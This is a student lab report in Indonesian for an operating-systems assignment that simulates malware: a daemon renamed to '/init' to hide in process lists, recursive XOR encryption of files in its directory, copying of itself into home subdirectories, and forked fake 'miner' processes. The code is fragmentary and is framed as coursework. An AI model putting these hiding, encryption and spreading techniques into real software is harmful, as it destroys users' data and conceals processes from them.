# Laporan Praktikum Sisop Modul 2 Kelompok IT21
# Anggota
1. Nisrina Bilqis - 5027241054
2. Hanif Mawla Faizi - 5027241064
3. Dina Rahmadani - 5027241065

# Soal_1

# Soal_2

# Soal_3
## Deskripsi Soal

Pada soal ini, kami diminta untuk mensimulasikan sebuah malware yang terdiri dari beberapa fitur layaknya ransomware atau worm sungguhan. Malware ini terdiri dari beberapa proses anak yang berjalan secara daemon dan berfungsi untuk mengenkripsi data, menyebarkan salinan binary, serta melakukan simulasi cryptomining.

Seluruh fitur harus dijalankan melalui satu binary utama `runme`, yang akan berubah nama prosesnya menjadi `/init`. Kemudian, secara paralel, `runme` akan memunculkan tiga proses anak:
- `wannacryptor` → proses enkripsi file
- `trojan.wrm` → proses penyebaran malware
- `rodok.exe` → proses simulasi fork bomb + cryptominer

Malware ini berjalan berulang setiap 30 detik, dan hanya `runme` yang benar-benar dijalankan, tidak mengeksekusi ulang hasil salinan malware yang tersebar.

---

### Subsoal a : Daemon dan Rename Proses
```c
daemonize();
prctl(PR_SET_NAME, "/init", 0, 0, 0);
```
- Program `runme` melakukan `daemonize()` untuk berjalan di background tanpa terminal.
- Menggunakan `prctl(PR_SET_NAME, "/init", ...)` untuk mengubah nama proses menjadi `/init`.
- Hal ini membuat proses utama malware tersamarkan saat dilihat di proses list (`ps`).

---

### Subsoal b : Enkripsi oleh `wannacryptor`
```c
void xor_file(const char *filepath, unsigned char key) {
    FILE *fp = fopen(filepath, "rb+");
    if (!fp) return;
    int ch;
    while ((ch = fgetc(fp)) != EOF) {
        fseek(fp, -1, SEEK_CUR);
        fputc(ch ^ key, fp);
    }
    fclose(fp);
}

```
```c
unsigned char key = (unsigned char)(time(NULL) % 256);
wannacryptor(root_path, key);

```
- Fungsi **wannacryptor()** akan men-scan semua file dan folder dalam direktori tempat **runme** dijalankan, lalu mengenkripsinya menggunakan operasi XOR dengan key dari timestamp.
- File **keylog.txt** disimpan untuk jaga-jaga bila perlu dekripsi.
- Karena kelompok **ganjil**, metode yang digunakan adalah **enkripsi rekursif langsung**, bukan ZIP.

---

### Subsoal c : Penyebaran Malware oleh `trojan.wrm`
```c
void spread_malware(const char *self_path) {
    ...
    snprintf(dest, sizeof(dest), "%s/runme", path);
    ...
    fwrite(buf, 1, n, dst);
    chmod(dest, 0755);
}

```
**Hasil yang Diharapkan :**
- Proses `trojan.wrm` akan menyebarkan salinan binary `runme` ke semua subdirektori dalam `/home/user`.
- Penyebaran hanya sebatas penyalinan (tidak mengeksekusi ulang salinan).
- Binary yang disalin tetap bernama `runme` dan memiliki izin eksekusi (chmod 755).

---

### Subsoal d : Looping 30 Detik
```c
while (1) {
    ...
    wannacryptor(...);
    sleep(30);
}

```
- Proses **wannacryptor** dan **trojan.wrm** berjalan selamanya dan melakukan tugasnya tiap 30 detik.
- **runme** utama akan tetap aktif dan menjadi parent dari seluruh proses ini.

---

### Subsoal e & f : Fork Bomb & Cryptomining oleh `rodok.exe`
```c
void spawn_miners() {
    for (int i = 0; i < 4; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            snprintf(name, sizeof(name), "mine-crafter-%d", i);
            ...
            while (1) {
                sleep(delay);
                generate_hash(hash);
                ...
                fprintf(f, "%s[Miner %02d] %s\n", timestamp, i, hash);
            }
        }
    }
}

```
```c
if (fork() == 0) {
    prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);
    spawn_miners();
    while (1) pause();
}

```
- **rodok.exe** akan memunculkan 4 proses **mine-crafter-XX** yang melakukan hashing acak (cryptomining) setiap 3–30 detik.
- Nama proses diubah agar tampil sebagai **mine-crafter-0**, **mine-crafter-1**, dst.
- Log hasil mining ditulis ke **/tmp/.miner.log**.

---

### Subsoal g : Logging Hash Cryptominer
**Contoh Log :**
```c
[2025-04-10 17:32:05][Miner 00] d1f4c93aa8dabc17e9a4...
```
**File Output :**
```
/tmp/.miner.log
```
- Hasil cryptomining dari setiap **mine-crafter** dicatat lengkap dengan timestamp dan ID prosesnya.

---

### H : Dependency Proses Fork
- rodok.exe adalah parent dari semua proses mine-crafter-XX.
- Karena rodok.exe menjalankan pause(), prosesnya tetap hidup dan menjaga anak-anaknya.
- Jika rodok.exe dihentikan (kill), maka semua mine-crafter juga akan mati.

# Soal_4
